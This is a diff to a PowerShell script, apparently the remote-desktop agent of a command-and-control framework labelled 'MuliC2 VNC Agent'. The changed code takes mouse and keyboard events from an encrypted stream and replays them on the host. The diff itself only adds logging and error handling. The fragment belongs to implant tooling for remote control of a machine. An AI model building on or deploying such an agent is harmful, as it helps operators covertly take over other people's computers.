@@ -1271,17 +1271,29 @@ try {
                 if ($event) {
                     Write-Host "[*] Received input event: $json" -ForegroundColor Cyan
                     if ($event.type -eq 'mouse') {
-                        Invoke-MouseEvent $event.event $event.x $event.y $event.button
+                        Write-Host "[*] Simulating mouse event: $($event.event) at ($($event.x), $($event.y)), button $($event.button)" -ForegroundColor Yellow
+                        try {
+                            Invoke-MouseEvent $event.event $event.x $event.y $event.button
+                            Write-Host "[*] Mouse event simulated." -ForegroundColor Green
+                        } catch {
+                            Write-Host "[!] Mouse event simulation failed: $($_.Exception.Message)" -ForegroundColor Red
+                        }
                     } elseif ($event.type -eq 'keyboard') {
-                        # No longer handling ctrlaltdel
                         Invoke-KeyboardEvent $event.key $event.event
                     } elseif ($event.type -eq 'test' -and $event.event -eq 'show_messagebox') {
-                        # Show a Windows MessageBox for test confirmation
-                        Add-Type -AssemblyName System.Windows.Forms
-                        [System.Windows.Forms.MessageBox]::Show("Remote input test successful!", "MuliC2 VNC Agent")
+                        Write-Host "[*] Attempting to show MessageBox" -ForegroundColor Yellow
+                        try {
+                            Add-Type -AssemblyName System.Windows.Forms
+                            [System.Windows.Forms.MessageBox]::Show("Remote input test successful!", "MuliC2 VNC Agent")
+                            Write-Host "[*] MessageBox should be visible now." -ForegroundColor Green
+                        } catch {
+                            Write-Host "[!] Failed to show MessageBox: $($_.Exception.Message)" -ForegroundColor Red
+                        }
                     }
                 }
-            } catch {}
+            } catch {
+                Write-Host "[!] Exception in input event listener: $($_.Exception.Message)" -ForegroundColor Red
+            }
             Start-Sleep -Milliseconds 10
         }
     } -ArgumentList $global:sslStream
